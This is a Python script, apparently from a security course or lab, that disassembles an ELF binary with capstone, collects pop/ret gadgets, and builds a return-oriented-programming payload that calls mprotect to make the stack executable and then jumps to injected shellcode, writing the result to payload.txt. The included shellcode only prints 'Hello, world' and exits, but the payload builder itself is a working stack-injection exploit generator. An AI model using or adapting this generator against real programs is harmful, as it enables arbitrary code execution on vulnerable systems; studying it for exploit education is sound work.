# disas.py

import sys
from capstone import *
from elftools.elf.elffile import ELFFile
from elftools.elf.relocation import RelocationSection
filename= 'a.out'
#for modified volun_prog2:
'''
base of binary: 0x555555554000
address of mprotect: 0x7ffff7affc00
start of payload: 0x7fffffffdf90
base of stack: 0x7fffffffe0b0
'''
disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args

def zerochecker(bytes, expectedLength):
    while len(bytes) != expectedLength:
        bytes = "0x0" + bytes[2:]
    return bytes

with open(filename, 'rb') as file:
        elf = ELFFile(file)
        code = elf.get_section_by_name('.text')

        ops = code.data() # type bytes
        opslist = ops.split(b'\xc3')
        opslist_index = 0
        while opslist_index < len(opslist) - 1:
            opslist[opslist_index] += b'\xc3'
            opslist_index += 1

        for x in opslist:
            print(x)

        addr = code['sh_addr'] # type int
        md = Cs(CS_ARCH_X86, CS_MODE_64)

        # gets all instructions, intended or not

        # want a list of byte arrays made from ops, split at returns (\xc3)
        # have addr etc for first one
        # for next call, increment addr by len of previous byte array

        while(opslist != []):
            while (opslist[0] != b""):
                for (address, size, mnemonic, op_str) in md.disasm_lite(opslist[0], addr):
                    if ((mnemonic ==  "pop") or (mnemonic == "ret")):
                         disas.append((address,mnemonic,op_str))
                         print("added a gadget, length of gadget list (with duplicates) = " + str(len(disas)))
                addr += 1
                opslist[0] = opslist[0][1:]
            opslist = opslist[1:]

print("done with both while loops!")

gadgets = []
gadgetIndex = 0
getOneRet = True
while gadgetIndex < len(disas):
        if ((disas[gadgetIndex][1] == 'ret') and getOneRet):
                gadgets.append((disas[gadgetIndex],))
                getOneRet = False
        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'ret'):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1]))
        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'ret')):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2]))
        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'ret')):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3]))
        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'ret')):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4]))
        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'pop') and (disas[gadgetIndex+5][1] == 'ret')):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4],disas[gadgetIndex+5]))


        gadgetIndex = gadgetIndex + 1

#remove duplicates
gadgets.sort()
gadgetIndex = 1
while gadgetIndex < len(gadgets):
        #if lengths are different, gadgets must be different
        if len(gadgets[gadgetIndex]) != len(gadgets[gadgetIndex-1]):
                gadgetIndex+=1
                continue
        gadgetIndex2 = 0
        broke = False
        while gadgetIndex2 < (len(gadgets[gadgetIndex])-1):
                #if args of instructions are different, gadgets must be different
                if gadgets[gadgetIndex][gadgetIndex2][2] != gadgets[gadgetIndex-1][gadgetIndex2][2]:
                        gadgetIndex += 1
                        broke = True
                        break
                gadgetIndex2 += 1
        if(not broke):
                del gadgets[gadgetIndex]

print("Available Gadgets: ")
for i in gadgets:
        print(i)

# now that duplicates are repmoved, remove gadgets with multiple of: rdi, rsi, rdx

shortest_rdi = 100
shortest_rsi = 100
shortest_rdx = 100
rdi_addr = b""
rsi_addr = b""
rdx_addr = b""

for x in range(0, len(gadgets)):
    if (gadgets[x][0][2] == "rdi") and (len(gadgets[x]) < shortest_rdi):
        shortest_rdi = len(gadgets[x])
        rdi_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])
    elif (gadgets[x][0][2] == "rsi") and (len(gadgets[x]) < shortest_rsi):
        shortest_rsi = len(gadgets[x])
        rsi_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])
    elif (gadgets[x][0][2] == "rdx") and (len(gadgets[x]) < shortest_rdx):
        shortest_rdx = len(gadgets[x])
        rdx_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])

print("shortest_rdi = " + str(shortest_rdi))
print(rdi_addr)
print("shortest_rsi = " + str(shortest_rsi))
print(rsi_addr)
print("shortest_rdx = " + str(shortest_rdx))
print(rdx_addr)

if (shortest_rdi == 100) or (shortest_rsi == 100) or (shortest_rdx == 100):
    sys.exit("Unable to find necessary gadgets to build payload!")

heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for stack: ")
if heapOrStack == "S":
        baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\":  ")
        addressOfMprotect = input("Input address of mprotect (PLT or libc is fine), including leading  \"0x\": ")
        addressOfPayload = input("Input address of start of ROP payload, including leading  \"0x\": ")
        baseOfStack = input("Input address of the base of the stack, including leading  \"0x\"")
        shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x01\x48\x81\xee\x10\x11\x11\x01\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x48\x83\xc7\x64\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"
        rdi_addr.reverse()
        rsi_addr.reverse()
        rdx_addr.reverse()

        #arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc st$
        #arg_addr.reverse()

        faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
        faddr_byte_array.reverse()

        baseOfStack_byte_array = bytearray.fromhex(baseOfStack[2:])
        baseOfStack_byte_array.reverse()


        # check if ROP payload has the gadgets etc to actually be built
        
        sizeOfStack = int(addressOfPayload, 16) - int(baseOfStack, 16)
        sizeOfPayload = 64+8*6*3 + len(shellcode)
        #start of mprotect = address of payload - size of payload - that mod 4096
        endOfStack = int(addressOfPayload, 16) - sizeOfPayload
        startOfMprotect = endOfStack - endOfStack%4096
        #size of mprotect = size of stack + size of payload + endofstack%4096
        sizeOfMprotect = sizeOfStack + sizeOfPayload + endOfStack%4096



        # start building ROP payload
        garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        print(hex(startOfMprotect))
        print(zerochecker(hex(startOfMprotect),18))
        rdi_arg = bytearray.fromhex(zerochecker(hex(startOfMprotect), 18)[2:])
        rdi_arg.reverse()
        rsi_arg = bytearray.fromhex(zerochecker(hex(sizeOfMprotect), 18)[2:])
        rsi_arg.reverse()
        rdx_arg = b"\x07\x00\x00\x00\x00\x00\x00\x00"
        mprotect_addr = faddr_byte_array

        # gadget addrs need to be calculated from base of binary

        payload = rdi_addr + rdi_arg + garbage * (shortest_rdi - 2)
        payload += rsi_addr + rsi_arg + garbage * (shortest_rsi - 2)
        payload += rdx_addr + rdx_arg + garbage * (shortest_rdx - 2)
        payload += mprotect_addr
        shellcode_addr = bytearray.fromhex(hex(int(addressOfPayload, 16) + len(payload) + 8)[2:])
        payload += shellcode_addr + b"\x00\x00" + shellcode
        f = open('payload.txt', 'wb')
        f.write(payload)
        f.close()
